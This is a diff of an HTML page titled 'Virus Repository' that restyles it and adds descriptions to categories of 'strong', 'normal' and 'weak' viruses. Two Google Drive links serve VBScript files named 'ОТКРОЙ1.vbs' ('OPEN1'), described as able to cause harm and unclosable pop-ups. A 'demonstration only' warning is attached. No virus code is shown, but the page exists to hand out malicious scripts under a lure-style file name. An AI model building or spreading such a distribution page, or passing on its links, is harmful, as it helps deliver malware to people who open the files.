@@ -6,18 +6,18 @@
     <title>Virus Repository</title>
     <style>
         body {
-            background-color: #000;
+            background-color: #121212;
             color: #fff;
-            font-family: Arial, sans-serif;
+            font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
         }
         h1 {
             text-align: center;
-            font-size: 50px;
-            color: #e74c3c;
-            text-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c, 0 0 30px #e74c3c;
-            margin-top: 20px;
+            font-size: 60px;
+            color: #ff0000;
+            text-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000, 0 0 50px #ff0000;
+            margin-top: 50px;
         }
         .container {
             text-align: center;
@@ -26,28 +26,41 @@
         .category-title {
             font-size: 32px;
             margin: 30px 0;
-            color: #e74c3c;
-            text-shadow: 0 0 5px #e74c3c, 0 0 10px #e74c3c, 0 0 15px #e74c3c;
+            color: #ff0000;
+            text-shadow: 0 0 5px #ff0000, 0 0 15px #ff0000, 0 0 25px #ff0000;
         }
         .virus-category a {
             display: inline-block;
             background-color: #c0392b;
             color: #fff;
-            padding: 12px 30px;
+            padding: 15px 40px;
             text-decoration: none;
-            border-radius: 5px;
-            margin-top: 20px;
-            font-size: 18px;
-            box-shadow: 0 0 10px #e74c3c, 0 0 20px #e74c3c;
+            border-radius: 10px;
+            margin-top: 30px;
+            font-size: 22px;
+            box-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000;
             transition: 0.3s ease-in-out;
         }
         .virus-category a:hover {
             background-color: #e74c3c;
-            box-shadow: 0 0 25px #e74c3c, 0 0 50px #e74c3c;
-            transform: scale(1.05);
+            box-shadow: 0 0 50px #ff0000, 0 0 100px #ff0000;
+            transform: scale(1.1);
         }
         .virus-category {
-            margin: 40px 0;
+            margin: 60px 0;
+        }
+        .description {
+            font-size: 18px;
+            color: #fff;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+            margin-top: 15px;
+            line-height: 1.5;
+        }
+        .warning {
+            font-size: 22px;
+            color: #f1c40f;
+            text-shadow: 0 0 5px #f1c40f, 0 0 10px #f1c40f;
+            margin-top: 40px;
         }
     </style>
 </head>
@@ -61,6 +74,9 @@
                 <h2>Сильные вирусы</h2>
             </div>
             <a href="#">Download Virus 1</a>
+            <div class="description">
+                These are the most dangerous viruses in our collection. Handle with caution.
+            </div>
         </div>
 
         <!-- Нормальные вирусы -->
@@ -69,6 +85,9 @@
                 <h2>Нормальные вирусы</h2>
             </div>
             <a href="https://drive.google.com/uc?export=download&id=1DotQCDk9qQuhA0A3N3U8dUWRDExF4E0t" target="_blank">Download ОТКРОЙ1.vbs</a>
+            <div class="description">
+                These viruses are of medium strength, and while not as destructive as the strong ones, they are still capable of causing harm.
+            </div>
         </div>
 
         <!-- Слабые вирусы -->
@@ -77,8 +96,15 @@
                 <h2>Слабые вирусы</h2>
             </div>
             <a href="https://drive.google.com/uc?export=download&id=1bS-FZJsMM5s1o0LLnovleiJ493QTmkn0" target="_blank">Download ОТКРОЙ1.vbs</a>
+            <div class="description">
+                These viruses are weak, but they can still cause disruptions, such as pop-up windows that cannot be closed.
+            </div>
         </div>
 
+        <!-- Предупреждение -->
+        <div class="warning">
+            WARNING: These viruses are intended for demonstration purposes only. DO NOT run them on any important system.
+        </div>
     </div>
 </body>
 </html>
